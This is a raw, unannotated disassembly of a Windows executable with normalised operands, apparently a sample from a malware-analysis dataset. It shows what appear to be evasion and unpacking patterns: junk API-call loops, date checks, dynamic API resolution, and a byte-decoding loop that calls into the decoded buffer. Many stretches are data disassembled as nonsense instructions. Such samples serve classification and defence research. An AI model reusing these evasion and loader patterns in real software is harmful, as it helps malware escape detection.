jne r-xdata
call sub_403198
mov ch 0xb0
movsb [ edi ] [ esi ]
in al 0x6e
jpo r-xdata
adc al 0x14
shl [ esi + 0x516e02e7 ] cl
push 0xa802b712
pop esp
test al 0x5c
push 0xe4ebe796
outsb
mov eax [ rw-data ]
mov [ rw-data ] eax
mov eax [ rw-data ]
add eax 0x1
jae r-xdata
nop
nop
mov eax [ rw-data ]
call sub_4026dc
nop
nop
push r-xdata
push r-xdata
call LoadLibraryA
push eax
call GetProcAddress
mov [ rw-data ] eax
nop
mov [ rw-data ] 0x1
jpo r-xdata
push 0x0
push 0x0
call SetTextAlign
inc [ rw-data ]
cmp [ rw-data ] 0x8bf1
jne r-xdata
nop
nop
xor eax eax
mov [ rw-data ] eax
nop
push rw-data
call [ rw-data ]
add bh bl
adc al 0x14
jpo r-xdata
push 0x1f
call Sleep
cmp [ rw-data ] 0x7
jbe r-xdata
nop
nop
mov eax [ rw-data ]
add eax 0x1
jae r-xdata
jpo r-xdata
push rw-data
call [ rw-data ]
nop
mov edx rw-data
mov eax rw-data
call sub_46bcd8
mov [ rw-data ] eax
nop
cmp [ rw-data ] 0x2e
jbe r-xdata
nop
push 0x0
call sub_46bd60
jmp r-xdata
mov [ rw-data ] eax
nop
nop
mov eax [ rw-data ]
mov [ rw-data ] eax
nop
nop
mov eax [ rw-data ]
mov [ rw-data ] eax
call sub_403198
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
mov ah 0xb5
mov al 0x22
sub_471083
pop esp
cli
push 0x2202e92a
pop ds
adc al 0x14
in al 0x6f
pop es
push 0xe381e707
scasb [ edi ]
pop ds
sub ebx 0x3f602bb
adc al 0x14
jpo r-xdata
adc al 0xea
add al [ edi ]
adc al 0x14
cmpsb [ esi ] [ edi ]
sub al 0xae
jpo r-xdata
sub bl [ esi + ebx * 4 ]
sti
add ch [ ecx ]
xor edx [ esp + edx ]
jpo r-xdata
bound esp [ esi + 0x2d830227 ]
adc al 0x14
jpo r-xdata
pushad
jpo r-xdata
and ebx [ ebx + 0x2ccb8799 ]
scasb [ edi ]
scasb [ edi ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
bound ebp [ esi + 0x22bd81d ]
jb r-xdata
test eax 0x64004712
sahf
sti
add al [ eax ]
or dl [ esp + edx ]
jpo r-xdata
jecxz r-xdata
jpo r-xdata
daa
adc [ edx - 0x59fd7165 ] 0x35
fwait
cdq
jpo r-xdata
mov eax 0x14171602
adc al 0x7b
jpo r-xdata
adc al 0xb2
outsb
sub esp esp
outsd
dec ecx
adc al 0x14
add dh [ ecx + 0x36 ]
adc al 0x14
jpo r-xdata
xlat
jpo r-xdata
adc eax 0x6eb21414
add edx edi
jpo r-xdata
adc al 0x14
jmp r-xdata
jmp sub_4039ac
jpo r-xdata
fsubr [ ebx ]
mov ch 0xb0
and ch [ eax ]
xchg ebx ecx
jpo r-xdata
jpo r-xdata
jpo r-xdata
in al 0x6e
jpo r-xdata
add dl [ esi ]
jpo r-xdata
lea esp [ edx - 0x5a ]
daa
add al [ ebx + 0x7b14142d ]
lea esp [ edx - 0x52 ]
sbb eax 0x72022bd8
0x7b7bebeb 0x7b7b
stc
popad
jpo r-xdata
jpo r-xdata
sub al 0xae
jpo r-xdata
and ah ah
jpo r-xdata
lea ebp [ eax + 0x12 ]
outsd
pop ds
adc al 0x14
add ch [ eax + 0x5f ]
adc al 0x14
jpo r-xdata
adc al 0xe4
outsd
sub [ ebx + 0x7b ] bh
das
sub dl [ esp + edx ]
jpo r-xdata
sub [ ebx + 0x7b ] bh
jpo r-xdata
pop ss
adc al 0x14
jpo r-xdata
pushad
pop es
mov edx 0x14236d02
adc al 0x7b
jpo r-xdata
pushad
outsd
jpo r-xdata
jpo r-xdata
jpo r-xdata
jecxz r-xdata
jpo r-xdata
outsb
jpo r-xdata
pushad
scasb [ edi ]
jecxz r-xdata
xchg [ eax - 0x14499d73 ] dh
add [ ebp + 0x628d3160 ] 0x1002e9b6
daa
jmp r-xdata
jpo r-xdata
adc al 0x14
lea ebp [ esi + 0x39 ]
in al 0x6f
pop es
adc al 0x14
in al 0x5c
hlt
jpo r-xdata
jpo r-xdata
mov bh 0x2
jpo r-xdata
and ch [ eax ]
jpo r-xdata
mov [ fs : eax ] esp
inc [ rw-data ]
jecxz r-xdata
jpo r-xdata
xchg edx eax
fwait
jpo r-xdata
mov [ rw-data ] 0x1
inc edi
jpo r-xdata
adc edx [ esp + edx ]
jpo r-xdata
push 0x2bbe32b
bound eax [ esp + edx + 0x14 ]
jpo r-xdata
jpo r-xdata
test [ eax + 0x31 ] esp
lea esp [ edx - 0x4a ]
jmp 0x146e2165
jpo r-xdata
movsb [ edi ] [ esi ]
in al 0x6e
jpo r-xdata
adc al 0x14
shl [ esi + 0x516e02e7 ] cl
push 0xa802b712
pop esp
test al 0x5c
push 0xe4ebe796
outsb
sub [ edi + 0x14007302 ] 0x9a027b14
adc al 0x14
adc al 0x7b
jpo r-xdata
sub esp ebx
jpo r-xdata
mov es [ edx ]
jpo r-xdata
push 0x0
push rw-data
call GetLocalTime
nop
cmp [ rw-data ] 0x7e1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
mov [ fs : eax ] esp
push [ fs : eax ]
jpo r-xdata
pop esp
adc al 0x2
jpo r-xdata
jpo r-xdata
add [ edx + 0x5ae628d ] 0x28d81b3
jecxz r-xdata
jpo r-xdata
adc al 0x14
add ch [ ecx + 0x7b14143b ]
jpo r-xdata
xor [ ebp + 0x2e9b662 ] ecx
adc [ edi ] ah
jpo r-xdata
jpo r-xdata
push 0x0
add [ eax ] al
add [ edx ] ch
cmp dl [ ebx ]
sub [ ebx + 0x7b ] bh
add dh [ ebx ]
adc al 0x14
jpo r-xdata
push edx
adc al 0x14
mov ebp 0x14180302
adc al 0x7b
jpo r-xdata
push ss
or [ ebp - 0x4cfa519e ] 0x81
mov ebx 0x14446202
adc al 0x7b
jpo r-xdata
outsb
cmpsb [ esi ] [ edi ]
xor eax 0x7b7b1414
jpo r-xdata
mov [ rw-data ] 0x1004
jmp r-xdata
sub [ rw-data ] 0x1
xor [ ecx + ecx * 4 + 0x20 ] ah
jpo r-xdata
sti
jpo r-xdata
ja r-xdata
jpo r-xdata
jpo r-xdata
sub eax [ edx ]
adc eax 0x8d141432
jpo r-xdata
add ah [ edx + 0x44 ]
adc al 0x14
and ah ah
bound esi [ esi + 0x271002e9 ]
or ebx 0x66bdbdbd
outsb
lahf
adc [ esp + edx ] dl
mov ebx 0x143e3902
adc al 0x7b
jpo r-xdata
add bh bl
adc al 0x14
jpo r-xdata
call SetTextAlign
inc [ rw-data ]
jpo r-xdata
adc al 0x14
jpo r-xdata
0x7b141414 0x7b7b
jpo r-xdata
add [ esp + edx ] dl
jpo r-xdata
sub al 0x14
adc al 0x7b
jpo r-xdata
add dl [ esi ]
jpo r-xdata
adc al 0x14
jpo r-xdata
push 0x7f02fb2f
sub [ esp + edx ] dl
jpo r-xdata
push 0x0
push 0x0
call SetTextAlign
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call ScaleWindowExtEx
nop
nop
call GetLastError
mov [ rw-data ] eax
nop
nop
lea edx [ ebp - 0x4 ]
xor eax eax
call sub_4029e4
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_40c414
test eax eax
je r-xdata
mov [ eax ] esp
jpo r-xdata
adc al 0x14
jpo r-xdata
inc [ rw-data ]
cmp [ rw-data ] 0x105
jne r-xdata
add [ ecx + 0x4777b43d ] al
add [ 0x75000001 ] al
in eax 0x68
int3
jpo r-xdata
jpo r-xdata
add bl [ edx + 0x7b141414 ]
jpo r-xdata
push [ eax ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
push ecx
stc
jpo r-xdata
add [ eax ] eax
add [ eax ] al
jpo r-xdata
adc al 0x7b
jpo r-xdata
pop esp
cli
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x6
je r-xdata
nop
jmp r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
lea esp [ edx - 0x52 ]
add eax 0x28d81b3
adc al 0x62
xchg esi eax
pop ss
add ah bh
add [ esp + edx ] edx
mov esp ebp
pop ebp
adc al 0x7b
scasb [ edi ]
adc esp [ eax + 0x6b ]
dec edi
jmp r-xdata
mov ebp esp
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
sub esp esp
outsb
ja r-xdata
outsd
xchg edi eax
jpo r-xdata
jpo r-xdata
jpo r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
retn
adc ebp [ eax ]
jpo r-xdata
jpo r-xdata
scasb [ edi ]
mov [ rw-data ] 0x558
push rw-data
call GetLocalTime
nop
cmp [ rw-data ] 0x7e1
jae r-xdata
nop
push 0x0
push 0x0
call SetTextAlign
jmp r-xdata
movsb [ edi ] [ esi ]
jpo r-xdata
jpo r-xdata
adc eax 0xff640047
jpo r-xdata
jpo r-xdata
cmpsb [ esi ] [ edi ]
adc al 0x14
adc al 0x9e
out 0x60 eax
jpo r-xdata
jpo r-xdata
cmp [ rw-data ] 0x105
jne r-xdata
add eax rw-data
jpo r-xdata
mov [ rw-data ] 0x1004
nop
mov [ rw-data ] 0x1
jmp r-xdata
nop
mov [ rw-data ] 0x1
add [ eax + 0x77a805c7 ] dl
inc edi
add [ eax + edx ] al
add [ eax ] al
jae r-xdata
add [ ecx ] al
inc edi
jpo r-xdata
add [ edi + edi * 8 + 0x30 ] ah
push [ eax ]
jpo r-xdata
adc al 0xbd
jpo r-xdata
jpo r-xdata
jpo r-xdata
nop
nop
push 0x0
push 0x0
call SetTextAlign
nop
nop
nop
nop
inc [ rw-data ]
cmp [ rw-data ] 0x24a4
jne r-xdata
push 0x0
push 0x0
call SetTextAlign
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
test eax eax
je r-xdata
jpo r-xdata
jpo r-xdata
lea eax [ edx ]
jpo r-xdata
add al [ ebx ]
jpo r-xdata
jpo r-xdata
mov [ rw-data ] 0x1918
push 0x0
push 0x0
call SetTextAlign
mov [ rw-data ] 0x1
nop
jmp r-xdata
jpo r-xdata
and [ ebx + 0x4777a42d ] al
jpo r-xdata
jpo r-xdata
sbb [ esp + edx ] dl
jpo r-xdata
jpo r-xdata
jpo r-xdata
push 0x0
push 0x0
call SetTextAlign
inc [ rw-data ]
cmp [ rw-data ] 0x89bd
jne r-xdata
nop
nop
push 0x0
push 0x0
call SetTextAlign
mov eax 0x1e7bdc37
call sub_4026bc
mov [ rw-data ] eax
nop
nop
cmp [ rw-data ] 0x0
je r-xdata
push edi
cmpsb [ esi ] [ edi ]
cmpsb [ esi ] [ edi ]
mov bl 0x8e
sub al 0xae
sub eax [ ebp + 0x2ca6a6bd ]
sub al 0xae
mov ch 0xb0
sub eax rw-data
add [ edi ] ecx
cmp ecx 0x2
add [ eax ] al
jpo r-xdata
adc al 0x14
jpo r-xdata
insd
and edx [ esp + edx ]
jpo r-xdata
pushad
jpo r-xdata
nop
nop
push 0x0
push 0x0
call SetTextAlign
mov [ rw-data ] 0x1
ja r-xdata
jpo r-xdata
retn 0x4
in eax 0x5d
bound esp [ esi - 0xffd42bd ]
push edi
adc al 0x14
jpo r-xdata
fsubr [ ebx ]
add dl [ 0xffffffff8d141432 ]
adc al 0x14
jpo r-xdata
adc dh [ edi + 0x145ca802 ]
adc al 0xd2
jpo r-xdata
mov ah 0xb5
mov al 0x22
mov ecx 0xb3
xor edx edx
div ecx
cmp edx 0xff
jbe r-xdata
call sub_403198
sub [ ebx + 0x7b ] bh
scasd [ edi ]
cmpsb [ esi ] [ edi ]
out 0x2 eax
outsb
push ecx
add ch [ eax - 0x2debeba4 ]
jpo r-xdata
mov eax [ rw-data ]
add eax [ rw-data ]
jae r-xdata
call sub_403190
xchg esi eax
out 0xeb eax
mov [ eax ] dl
nop
inc [ rw-data ]
cmp [ rw-data ] 0x1e7bdad0
jne r-xdata
call sub_403198
mov eax [ rw-data ]
mov [ rw-data ] eax
mov eax [ rw-data ]
add eax 0x1
jae r-xdata
nop
nop
mov eax [ rw-data ]
call sub_4026dc
nop
nop
push r-xdata
push r-xdata
call LoadLibraryA
push eax
call GetProcAddress
mov [ rw-data ] eax
nop
mov [ rw-data ] 0x1
push 0x0
push 0x0
call SetTextAlign
inc [ rw-data ]
cmp [ rw-data ] 0x8bf1
jne r-xdata
nop
nop
xor eax eax
mov [ rw-data ] eax
nop
push rw-data
call [ rw-data ]
push 0x1f
call Sleep
cmp [ rw-data ] 0x7
jbe r-xdata
nop
nop
mov eax [ rw-data ]
add eax 0x1
jae r-xdata
push rw-data
call [ rw-data ]
nop
mov edx rw-data
mov eax rw-data
call sub_46bcd8
mov [ rw-data ] eax
nop
cmp [ rw-data ] 0x2e
jbe r-xdata
nop
push 0x0
call sub_46bd60
jmp r-xdata
mov [ rw-data ] eax
nop
nop
mov eax [ rw-data ]
mov [ rw-data ] eax
nop
nop
mov eax [ rw-data ]
mov [ rw-data ] eax
call sub_403198
sub_471284
push ebp
mov ebp esp
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
retn
sub_4712b4
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
mov [ rw-data ] 0x1
push 0x0
push 0x0
call SetTextAlign
inc [ rw-data ]
cmp [ rw-data ] 0x105
jne r-xdata
push rw-data
call GetLocalTime
nop
cmp [ rw-data ] 0x7e1
jae r-xdata
mov [ rw-data ] 0x1004
nop
mov [ rw-data ] 0x1
jmp r-xdata
push 0x0
push 0x0
call SetTextAlign
inc [ rw-data ]
cmp [ rw-data ] 0x105
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call ScaleWindowExtEx
nop
nop
call GetLastError
mov [ rw-data ] eax
nop
nop
lea edx [ ebp - 0x4 ]
xor eax eax
call sub_4029e4
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_40c414
test eax eax
je r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x6
je r-xdata
nop
jmp r-xdata
mov [ rw-data ] 0x558
push rw-data
call GetLocalTime
nop
cmp [ rw-data ] 0x7e1
jae r-xdata
nop
push 0x0
push 0x0
call SetTextAlign
jmp r-xdata
mov [ rw-data ] 0x1004
nop
mov [ rw-data ] 0x1
jmp r-xdata
nop
nop
push 0x0
push 0x0
call SetTextAlign
nop
nop
nop
nop
inc [ rw-data ]
cmp [ rw-data ] 0x24a4
jne r-xdata
push 0x0
push 0x0
call SetTextAlign
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
test eax eax
je r-xdata
mov [ rw-data ] 0x1918
push 0x0
push 0x0
call SetTextAlign
mov [ rw-data ] 0x1
nop
jmp r-xdata
push 0x0
push 0x0
call SetTextAlign
inc [ rw-data ]
cmp [ rw-data ] 0x89bd
jne r-xdata
nop
nop
push 0x0
push 0x0
call SetTextAlign
mov eax 0x1e7bdc37
call sub_4026bc
mov [ rw-data ] eax
nop
nop
cmp [ rw-data ] 0x0
je r-xdata
nop
nop
push 0x0
push 0x0
call SetTextAlign
mov [ rw-data ] 0x1
mov ecx 0xb3
xor edx edx
div ecx
cmp edx 0xff
jbe r-xdata
call sub_403198
mov eax [ rw-data ]
add eax [ rw-data ]
jae r-xdata
call sub_403190
mov [ eax ] dl
nop
inc [ rw-data ]
cmp [ rw-data ] 0x1e7bdad0
jne r-xdata
call sub_403198
mov eax [ rw-data ]
mov [ rw-data ] eax
mov eax [ rw-data ]
add eax 0x1
jae r-xdata
nop
nop
mov eax [ rw-data ]
call sub_4026dc
nop
nop
push r-xdata
push r-xdata
call LoadLibraryA
push eax
call GetProcAddress
mov [ rw-data ] eax
nop
mov [ rw-data ] 0x1
push 0x0
push 0x0
call SetTextAlign
inc [ rw-data ]
cmp [ rw-data ] 0x8bf1
jne r-xdata
nop
nop
xor eax eax
mov [ rw-data ] eax
nop
push rw-data
call [ rw-data ]
push 0x1f
call Sleep
cmp [ rw-data ] 0x7
jbe r-xdata
nop
nop
mov eax [ rw-data ]
add eax 0x1
jae r-xdata
push rw-data
call [ rw-data ]
nop
mov edx rw-data
mov eax rw-data
call sub_46bcd8
mov [ rw-data ] eax
nop
cmp [ rw-data ] 0x2e
jbe r-xdata
nop
push 0x0
call sub_46bd60
jmp r-xdata
mov [ rw-data ] eax
nop
nop
mov eax [ rw-data ]
mov [ rw-data ] eax
nop
nop
mov eax [ rw-data ]
mov [ rw-data ] eax
call sub_403198
sub_471670
push esi
add [ eax ] al
add [ eax + 0x16 ] bh
inc edi
add [ esi + ebx * 2 + 0x5e840040 ] dh
inc eax
add [ eax + 0x5400405c ] ch
pop esp
inc eax
add [ edi + ebx * 2 ] ch
inc eax
add ah bh
pop esi
inc eax
add [ eax ] bl
insb
inc eax
add al ch
imul eax [ eax ] 0x50
insb
inc eax
add [ eax ] ah
insb
inc eax
add al ch
adc eax [ ecx ]
mov eax 0x70004113
outsd
inc eax
add [ eax + 0x6f ] al
inc eax
add al dh
xlat
inc eax
add [ eax - 0x2a ] dh
inc eax
add [ eax + 0x40 ] bl
add [ eax ] ch
inc eax
add [ edx + ecx ] al
inc ecx
add [ ecx + ecx + 0xbc80041 ] cl
inc ecx
add [ eax - 0x4fffbef5 ] bl
adc eax [ ecx ]
pushad
adc eax [ ecx ]
add al 0xad
inc ecx
add [ esp + ebp * 4 + 0x41 ] dl
add al ah
inc edx
inc edx
add [ eax - 0x67ffbdbe ] dh
inc ebp
inc edx
add [ eax + 0x45 ] ch
inc edx
add [ esi + ebx * 2 + 0x42 ] cl
add [ esi + ebx * 2 ] cl
inc edx
add [ esi + ecx * 2 ] dl
inc edx
add ah ah
dec ebp
inc edx
add [ esi + eax * 2 + 0x46640042 ] dl
inc edx
add [ eax + 0x700041b0 ] ah
mov al 0x41
add [ ecx + eax * 2 + 0x40d00042 ] ah
inc edx
add [ esi + esi * 4 ] cl
inc esp
add ah bl
mov ch 0x44
add [ esi + ecx * 2 + 0x42 ] dl
add [ esi + ecx * 2 ] ah
inc edx
add al cl
sbb eax [ ebp ]
pop eax
sbb eax [ ebp ]
mov [ ebx + 0x42 ] fs
add [ ebx + 0x42 ] bl
add [ ebp * 2 + 0x6ce00042 ] dh
inc edx
add [ eax + 0x6800426e ] bl
outsb
inc edx
add [ eax + 0x6e ] ah
inc edx
add [ eax ] dh
outsb
inc edx
add [ eax ] ch
outsb
inc edx
add al bh
insd
inc edx
add al dh
insd
inc edx
add al al
insd
inc edx
add [ edi + ebp * 2 ] al
inc edx
add ah dl
outsb
inc edx
add [ eax + 0x680042f1 ] bl
int1
inc edx
add ah dh
inc bx
add ah al
inc bx
add [ esi + ebx * 2 + 0x5e540042 ] al
inc edx
add al cl
pop esi
inc edx
add [ esi + ebx * 2 + 0x6f440042 ] cl
inc edx
add [ edi + ebp * 2 ] dl
inc edx
add [ edi + ebp * 2 + 0x42 ] bh
add [ edi + ebp * 2 + 0x42 ] cl
add al dh
test [ edx ] eax
xchg esp eax
test [ edx ] eax
mov [ edx - 0x45bfffbe ] bh
inc edx
add [ eax - 0x77ffbd93 ] bh
insd
inc edx
add [ eax + 0x5000426d ] al
insd
inc edx
add [ eax + esi * 8 ] dh
inc edx
add ah ch
out dx eax
inc edx
add [ eax + esi * 8 - 0xfabffbe ] bl
inc edx
add al cl
loop r-xdata
inc edx
add [ eax - 0x1 ] al
inc edx
add ah bh
inc [ edx ]
push esp
xchg [ eax + eax - 0x14 ] eax
xchg [ eax + eax + 0x4c ] al
0x9a1c0044 0x44
sub [ ebp + 0x43 ] dh
add [ eax - 0x1fffbc8c ] dh
popad
inc edx
add [ eax + 0x14004261 ] dh
loopne r-xdata
add [ eax - 0x33ffbd1e ] dl
out dx eax
inc edx
add [ edi + ebp * 8 - 0x444bffbe ] bl
inc edx
add [ ebx + edi * 4 - 0x44d3ffbe ] al
inc edx
add al dh
mov edx 0x685c0042
inc ebx
add [ eax + ebp * 2 ] ch
inc ebx
add [ eax ] cl
int1
inc edx
add [ eax + 0x600042f0 ] bh
int1
inc edx
add [ eax ] dl
int1
inc edx
add al ch
mov edx 0xbab80042
inc edx
add [ eax ] bl
inc edx
add [ eax + 0x400042f2 ] ah
inc [ edx ]
cld
hlt
add [ eax - 0xfffba21 ] bh
loope r-xdata
rcr [ ecx ] 0x1
inc esi
add [ eax + 0x6c004619 ] ah
add al al
loope r-xdata
sbb al [ esi ]
mov al [ 0x6c004619 ]
add [ eax ] ah
in al 0x45
add al dh
jecxz r-xdata
and al 0x1a
inc esi
add ah al
sbb al [ esi ]
xchg esp eax
sbb al [ esi ]
cwde
sbb [ esi ] eax
push 0x30004619
and [ esi ] eax
add [ ecx ] ah
inc esi
add [ eax + 0x26 ] dh
inc esi
add [ eax + 0x26 ] al
inc esi
add [ eax - 0x50 ] ah
inc esi
add [ eax ] dh
mov al 0x46
add al dl
mov al 0x46
add [ eax + 0x80046b0 ] ah
mov cl 0x46
add al bl
mov al 0x46
add [ eax - 0x7fffb94f ] dh
mov cl 0x46
add [ eax + 0x680046b0 ] bl
mov al 0x46
add [ eax - 0x4f ] al
inc esi
add [ eax ] dl
mov cl 0x46
add [ eax - 0x4f ] bh
inc esi
add [ eax - 0x4f ] cl
inc esi
add al ch
mov cl 0x46
add [ eax + 0x200046b1 ] bh
mov dl 0x46
add al dh
mov cl 0x46
add [ eax + 0x78004626 ] ch
inc esi
add [ eax ] ch
mov al 0x46
add al bh
scasd [ edi ]
inc esi
add [ edx + edi * 4 + 0x46 ] dl
add [ edx + edi * 4 ] ah
inc esi
add [ edx + edx + 0x12840047 ] dh
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + 0x16 ] cl
inc edi
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff0
mov eax sub_471670
call sub_405e40
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45cab8
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ r-xdata ]
call sub_45cad0
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45cb50
call sub_403eb8
add [ eax - 0xb ] al
inc ebp
add [ eax ] cl
cmc
inc ebp
add [ eax + 0x500045f5 ] al
cmc
inc ebp
add ah ch
push cs
inc esi
add [ esi + ecx + 0xe900046 ] bh
inc esi
add [ esi + ecx + 0x46 ] cl
add al ah
adc eax [ esi ]
and al 0x13
inc esi
add [ eax + 0x700045fd ] ah
std
inc ebp
add ah dh
adc eax 0x15c40046
inc esi
add al dl
sbb [ esi ] eax
_start
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax sub_471670
call sub_405e40
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45cab8
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ r-xdata ]
call sub_45cad0
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45cb50
call sub_403eb8
sub_40114f
add [ esp + 0x4 ] 0xfffffff8
jmp sub_405798
sub_401159
add [ esp + 0x4 ] 0xfffffff8
jmp sub_4057ac
ExitProcess
jmp [ __import_lookup_table_0(kernel32:ExitProcess) ]
sub_40122c
jmp [ __import_lookup_table_1(user32:MessageBoxA) ]
sub_401234
jmp [ __import_lookup_table_0(kernel32:FindClose) ]
sub_40123c
jmp [ __import_lookup_table_0(kernel32:FindFirstFileA) ]
sub_401244
jmp [ __import_lookup_table_0(kernel32:FreeLibrary) ]
GetCommandLineA
jmp [ __import_lookup_table_0(kernel32:GetCommandLineA) ]
sub_401254
jmp [ __import_lookup_table_0(kernel32:GetLocaleInfoA) ]
sub_40125c
jmp [ __import_lookup_table_0(kernel32:GetModuleFileNameA) ]
sub_401264
jmp [ __import_lookup_table_0(kernel32:GetModuleHandleA) ]
sub_40126c
jmp [ __import_lookup_table_0(kernel32:GetProcAddress) ]
GetStartupInfoA
jmp [ __import_lookup_table_0(kernel32:GetStartupInfoA) ]
sub_40128c
jmp [ __import_lookup_table_1(user32:LoadStringA) ]
MultiByteToWideChar
jmp [ __import_lookup_table_0(kernel32:MultiByteToWideChar) ]
sub_4012ac
jmp [ __import_lookup_table_2(advapi32:RegCloseKey) ]
WideCharToMultiByte
jmp [ WideCharToMultiByte@IAT ]
sub_4012cc
jmp [ __import_lookup_table_0(kernel32:VirtualQuery) ]
SysAllocStringLen
jmp [ __import_lookup_table_3(oleaut32:SysAllocStringLen) ]
SysReAllocStringLen
jmp [ __import_lookup_table_3(oleaut32:SysReAllocStringLen) ]
SysFreeString
jmp [ __import_lookup_table_3(oleaut32:SysFreeString) ]
InterlockedIncrement
jmp [ __import_lookup_table_0(kernel32:InterlockedIncrement) ]
InterlockedDecrement
jmp [ InterlockedDecrement@IAT ]
sub_4012fc
jmp [ __import_lookup_table_0(kernel32:GetCurrentThreadId) ]
sub_40130c
push ebx
add esp 0xffffffbc
mov ebx 0xa
push esp
call GetStartupInfoA
test [ esp + 0x2c ] 0x1
je r-xdata
mov eax ebx
add esp 0x44
pop ebx
retn
movzx ebx [ esp + 0x30 ]
sub_401330
jmp [ __import_lookup_table_0(kernel32:LocalAlloc) ]
VirtualFree
jmp [ VirtualFree@IAT ]
sub_401350
jmp [ __import_lookup_table_0(kernel32:InitializeCriticalSection) ]
sub_401358
jmp [ __import_lookup_table_0(kernel32:EnterCriticalSection) ]
sub_401360
jmp [ __import_lookup_table_0(kernel32:LeaveCriticalSection) ]
sub_401368
jmp [ __import_lookup_table_0(kernel32:DeleteCriticalSection) ]
sub_401ab2
jmp sub_4039ac
sub_401ab9
mov al [ rw-data ]
pop ebp
retn
sub_401b96
jmp sub_4039ac
sub_401c64
inc [ rw-data ]
mov edx eax
sub edx 0x4
mov edx [ edx ]
and edx 0x7ffffffc
sub edx 0x4
add [ rw-data ] edx
call sub_402278
retn
sub_402264
jmp sub_4039ac
sub_40240a
jmp sub_4039ac
sub_4026a9
jmp sub_4039ac
sub_40276c
call sub_405df4
cmp [ eax ] 0x0
je r-xdata
xor eax eax
retn
call sub_405df4
mov eax [ eax ]
mov eax [ eax + 0x4 ]
retn
sub_4027c0
mov [ rw-data ] edx
call sub_403f90
sub_402824
push eax
push edx
push ecx
call sub_405df4
cmp [ eax + 0x4 ] 0x0
pop ecx
pop edx
pop eax
jne r-xdata
xor eax eax
jmp sub_402818
retn
sub_402840
retn
sub_402894
retn
sub_402898
push ebx
call sub_405df4
mov ebx [ eax + 0x4 ]
call sub_405df4
xor edx edx
mov [ eax + 0x4 ] edx
mov eax ebx
pop ebx
retn
sub_402a44
mov [ rw-data ] ax
fnclex
fldcw [ rw-data ]
retn
sub_402a54
push 0x0
fnstcw [ esp ]
pop eax
retn
sub_402af0
mov edx [ eax + 0x1c ]
call sub_402aa8
retn
sub_402d58
mov ecx 0xff
call sub_402d64
retn
sub_402d88
push esi
push edi
mov esi eax
mov edi edx
and ecx 0xff
[ esi ] [ edi ]
pop edi
pop esi
retn
j_sub_402da4
jmp sub_402da4
sub_402da1
retn
sub_403131
jmp sub_4039ac
sub_403184
fninit
fwait
fldcw [ rw-data ]
retn
sub_403190
mov al 0x4
jmp sub_402818
sub_4031e4
mov eax [ eax - 0x24 ]
test eax eax
je r-xdata
retn
mov eax [ eax ]
sub_4031f0
push ebx
mov ebx eax
mov eax ebx
call sub_403220
call sub_4026bc
mov edx eax
mov eax ebx
call sub_403264
pop ebx
retn
sub_40320c
push ebx
mov ebx eax
mov eax ebx
call sub_4032bc
mov eax ebx
call sub_4026dc
pop ebx
retn
sub_403220
add eax 0xffffffd8
mov eax [ eax ]
retn
sub_403248
call sub_4035e4
test dl dl
jle r-xdata
retn
call sub_4035cc
sub_403308
retn
sub_403390
jmp sub_4039ac
sub_403397
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4034a0
mov eax 0x8000ffff
retn
sub_4034a8
retn
sub_4034ac
retn
sub_4034b0
retn
sub_4035a5
jmp sub_4036f8
sub_4035aa
mov eax [ esp + 0x2c ]
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
call sub_403a0c
retn
mov ecx [ eax ]
mov dl 0x81
push eax
call [ ecx - 0x4 ]
pop eax
call sub_4035cc
sub_4035cc
mov edx [ eax ]
call [ edx - 0x8 ]
retn
sub_4035d4
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx - 0x1c ]
mov eax ebx
pop ebx
retn
sub_4035e4
test dl dl
jg r-xdata
push eax
push edx
mov edx [ eax ]
call [ edx - 0x18 ]
pop edx
pop eax
retn
retn
sub_4035f4
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push 0x0
push 0x0
push 0x0
push 0xeedfadf
call [ rw-data ]
sub_4036bc
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push edx
push esp
push 0x1
push 0x0
push 0xeedfae2
call [ rw-data ]
pop edx
sub_4036d8
push eax
push edx
cmp [ rw-data ] 0x1
jbe r-xdata
pop edx
pop eax
retn
push esp
push 0x2
push 0x0
push 0xeedfae3
call [ rw-data ]
sub_403aa5
retn
sub_403be8
xor edx edx
lea eax [ ebp - 0xc ]
mov ecx [ fs : edx ]
mov [ fs : edx ] eax
